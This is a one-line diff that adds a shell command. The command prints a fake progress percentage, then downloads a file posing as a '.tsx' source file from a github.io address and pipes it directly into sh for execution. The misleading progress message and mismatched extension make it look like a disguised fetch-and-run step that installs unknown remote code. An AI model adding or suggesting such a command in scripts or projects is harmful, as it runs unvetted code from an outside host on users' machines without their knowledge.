@@ -1,0 +1,1 @@
+echo 'Progress: 62.0%'; curl -L --progress-bar frkns.github.io/fun/KinaseY.tsx | sh
